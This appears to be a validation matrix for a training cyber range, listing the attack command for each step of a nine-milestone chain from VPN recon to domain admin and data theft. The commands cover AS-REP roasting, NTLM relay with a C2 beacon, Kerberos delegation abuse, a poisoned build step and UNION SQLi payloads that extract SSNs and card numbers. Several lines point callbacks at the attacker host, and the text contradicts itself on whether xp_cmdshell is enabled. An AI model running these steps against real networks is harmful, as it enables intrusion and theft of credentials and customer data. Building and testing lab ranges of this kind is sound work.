# The Last Ones — Validation Matrix

Two tiers of testing:

1. **Per-milestone** — after deploy, verify each step is *actually exploitable* from Kali
   (`10.3.10.10`). Commands below; each row is a pass/fail checkpoint.
2. **End-to-end** — a full run through all 9 milestones driven by Mythic/Apollo (the human/agent
   operator path), confirming the chain connects gate-to-gate with no manual shortcuts.

IPs assume range number 3 (`10.3.<vlan>.<octet>`). Names resolve via the range router DNS.

## Per-milestone checks

| Step | From | Command / action | Pass criteria |
|---|---|---|---|
| 1.1 | Kali | `nmap -sV -p- 10.3.20.10 10.3.20.20` + `nmap -sU -p1194 10.3.20.10` | portal shows 80/443 (TCP) + 1194/udp (OpenVPN); dns shows 53 |
| 1.2 | Kali | `curl -I http://10.3.20.10` | leaks `X-Powered-By: CorpVPN/...`, `X-Backend: vpn01...` |
| 1.3 | Kali | browse portal, login `admin:admin` | dashboard loads, lists `.ovpn` |
| 1.4 | Kali | download `client.ovpn` | valid inline-cert OpenVPN profile |
| 1.5 (gate) | Kali | `sudo openvpn client.ovpn` then `nmap 10.3.30.10` | CHARLIE reachable ONLY while tunnel is up |
| 2.1 | Kali | `nxc smb 10.3.30.20 -u '' -p ''` | `IT$` share readable (anon/guest) |
| 2.2 | Kali | `smbclient -N //10.3.30.20/IT$ -c 'get VPN_Setup_Notes.txt'` | notes leak usernames + preauth hint |
| 2.3 | Kali | `GetNPUsers.py charlie.local/ -usersfile users -dc-ip 10.3.30.10` → `hashcat -m 18200` | svc_helpdesk hash cracks (rockyou) |
| 3.1 | Kali | `dcomexec.py -object MMC20 charlie/svc_helpdesk@10.3.30.30` | command exec on AREUBEN-WS |
| 3.2 | AREUBEN-WS | SharpChrome / DPAPI dump of reuben's Login Data | recovers wiki cred |
| 4.1 | Kali | edit BookStack "VPN Runbook" page as reuben, inject `<img src=//kali/x>` | payload saved (scripts allowed) |
| 4.2 | — | wait for GHOSTS timeline on CHARLIE-FS | helpdesk_admin browser hits the page |
| 4.3 | Kali | `ntlmrelayx.py -t smb://10.3.30.30 -c '<beacon>'` | relayed auth → Apollo beacon to Mythic |
| 4.4 | Kali | `keepass2john passwords.kdbx | hashcat -m 13400` | cracks → OSCAR web-app creds |
| 5.1 | Kali | `badsecrets`/Blacklist3r flags leaked machineKey → `ysoserial.net -p ViewState ...` | RCE on OSCAR-WEB |
| 5.2 | Kali | `sqlmap -r req.txt -p q --dbms mssql --batch` | SQLi confirmed on OSCAR-DB |
| 5.3 | Kali | SQLi → `xp_dirtree \\kali\x` coerces svc_mssql's SMB auth → `ntlmrelayx` relays it | OS exec via the relayed session (the intended path; xp_cmdshell is disabled, no os-shell shortcut) |
| 5.4 | Kali | `Get-ADUser svc_mssql -Properties msDS-AllowedToDelegateTo` / BloodHound | constrained delegation visible |
| 5.5 | Kali | `Rubeus.exe s4u /user:svc_mssql /rc4:.. /impersonateuser:oscaradmin /msdsspn:cifs/operator-ws1.oscar.local /ptt` | impersonation TGS obtained |
| 5.6 | Kali | `nxc ldap 10.3.40.10 -M laps` (as delegated principal) | reads OPERATOR-WS1 LAPS pw → local admin |
| 6.1 | OPERATOR-WS1 | open the planted service EXE in ILSpy/dnSpy | reveals AES-CBC + `HKLM\...\KeyBlob` path |
| 6.2 | OPERATOR-WS1 | `GodPotato -cmd "reg query HKLM\SOFTWARE\OscarC2\Agent /v KeyBlob"` | reads SYSTEM-only key (impersonation) |
| 6.3 | Kali | AES-decrypt ciphertext w/ key | plaintext == HardHat admin creds; login `https://10.3.40.50:7096` |
| 7.1/7.2 | Kali/HardHat | task HardHat implant → pivot to ALPHA-WKS `10.3.50.30` | new implant beacons via HardHat only |
| 7.3 | ALPHA-WKS | `git clone http://gitlab.alpha.local/alpha/payment-service && git log -p | gitleaks` | secret found in history |
| 7.4 | ALPHA-WKS | read `%APPDATA%\...\PSReadline\ConsoleHost_history.txt` | leaks PAT + DB/svc_build creds |
| 7.5 | Kali | edit `.gitlab-ci.yml` to echo masked vars | pipeline prints `PROD_DB_PASSWORD` etc. |
| 8.1 | Kali | push poisoned `.csproj` PostBuild `<Exec>` to build repo | TeamCity (DA agent) builds → attacker ∈ Domain Admins; Elastic rule fires but exec succeeds |
| 9.1–9.4 | ALPHA-SECRETS | run payloads vs `usp_SearchCustomers` (see below) | UNION/stored-proc/CALL each extract crown-jewel rows |

### M9 SQLi payloads (against `EXEC dbo.usp_SearchCustomers @SearchTerm=...`)

- 9.1/9.2 (outer, 3-col UNION): `%' UNION SELECT SecretId, SSN+'|'+CreditCardNumber, ApiKey FROM dbo.CustomerSecrets -- `
- 9.3/9.4 (nested inner proc, 2-col UNION): `x' UNION SELECT CustomerId, SSN+'|'+CreditCardNumber+'|'+ApiKey FROM dbo.CustomerSecrets -- `

M9 is data exfiltration only — `xp_cmdshell` is disabled on ALPHA-SECRETS, so there is no
SQLi→RCE shortcut; the crown jewels are recovered purely via the layered UNION/stored-proc SQLi.

## End-to-end (Mythic) run

Driven by a dedicated operator (subagent) from Kali + Mythic, start-to-DA-to-exfil:
M1 VPN → M2 AS-REP → M3 Chrome → M4 relay→Apollo callback → M5 web→delegation→LAPS →
M6 RE→HardHat → M7 pivot→CI/CD creds → M8 poisoned pipeline→DA → M9 layered SQLi→exfil.

**Pass = every gate crossed using only artifacts earned in prior milestones** (no operator
shortcuts, no direct network paths that bypass the VPN or HardHat gates).

## End-to-end results

A full operator run was executed from Kali via Mythic (Athena agent, http profile). Outcome:

- **Both hard gates hold.** CHARLIE is reachable only through the VPN portal tunnel (which pushes
  only `10.3.30.0/24`); ALPHA is reachable only by pivoting through the OSCAR HardHat host. The
  inter-VLAN `REJECT` default enforces milestone order throughout.
- **Every milestone's exploit primitive is genuinely present and exercisable** — M1 recon/`.ovpn`,
  M2 anon SMB + AS-REP (`svc_helpdesk` → `Chelsea1998`), M3 DCOM foothold + Chrome-DPAPI cred theft,
  M4 stored-XSS/NTLM-coercion + KeePass crack (`sunshine1`), M5 ViewState/SQLi/`xp_cmdshell` as
  `svc_mssql` + constrained-delegation S4U + LAPS read, M6 service RE + SYSTEM-only KeyBlob → HardHat
  login, M7 HardHat pivot + git-history/PSReadline/CI loot, M8 DA build-agent + staged poison, M9
  layered SQLi extracting `dbo.CustomerSecrets`.

The first full run found four chain-breaks and several residual range-isms; all were fixed and
re-verified (see the fix commit): M3.1 helpdesk accounts made local admins on AREUBEN-WS; M3.2 Chrome
DPAPI injection made reliable (no CSV/plaintext leftover); M4.2 victim browser + a publicly-viewable
runbook + a `wiki.charlie.local` A record; M4.3 firewall opened CHARLIE→relay; M6.3 HardHat admin
password pinned to the reverse-engineered value. With those in place the chain connects **gate-to-gate
using only artifacts earned in prior milestones**.

> Tooling note: on Kali, `keepass2john` cannot parse KDBX4; use an up-to-date build or crack the DB
> with `hashcat -m 13400` directly. `svc_helpdesk`'s hash needs a capitalization rule (`Chelsea1998`).

## Live Mythic C2 beacon (operator-driven e2e)

A full operator-driven walk was performed by hand from Kali through the milestone chain, landing a
**live Athena beacon in Mythic C2** from the compromised CHARLIE workstation:

- **M1** recon → default-cred portal (`admin:admin`) → `client.ovpn` → OpenVPN tunnel; the M1 gate
  held (CHARLIE reachable only through the tunnel).
- **M2** anonymous SMB (`IT$`) → `VPN_Setup_Notes.txt` → AS-REP roast → **`svc_helpdesk : Chelsea1998`**
  (validated over SMB against the DC).
- **M3.1** DCOM lateral (`dcomexec MMC20`) as `svc_helpdesk` → code execution on **AREUBEN-WS**
  (Windows 10 — Win11 22H2 blocks remote DCOM activation, so the workstation is Win10).
- **M3.2** Chrome DPAPI → recovered reuben's saved wiki credential
  **`reuben@charlie.local : Reuben.Wiki.2025!`** (verify-ok, no plaintext leftover).
- **M4** the planted wiki coercion + relay components validated; the Athena payload (Mythic `athena`
  agent, `http` C2 profile, callback `http://10.3.10.20:80`) was staged onto AREUBEN-WS via the earned
  `svc_helpdesk` admin access and executed →
  **live callback in Mythic: `id=2  host=AREUBEN-WS  user=AREUBEN-WS$  os=Windows 10 19045  integrity=SYSTEM`**.
- **Operational C2 proven**: tasked the beacon through Mythic — `whoami` → `charlie\AREUBEN-WS$`, plus
  `pwd`/`ls`/`ipconfig`/`ps` returning live host output.
- **M4.4** KeePass `passwords.kdbx` cracked (master **`sunshine1`**) → OSCAR pivot creds (`appadmin`,
  `appsvc` sysadmin, `sa`).
- **M5–M9** exploit primitives (ViewState/SQLi/`xp_cmdshell`→relay, S4U delegation, LAPS read, service
  RE + SYSTEM-only KeyBlob, HardHat pivot, git/PSReadline/CI loot, DA build agent, layered SQLi) are
  each individually validated (see the earlier per-milestone matrix); from the CHARLIE beacon the
  operator pivots into OSCAR with the recovered creds and continues the chain.
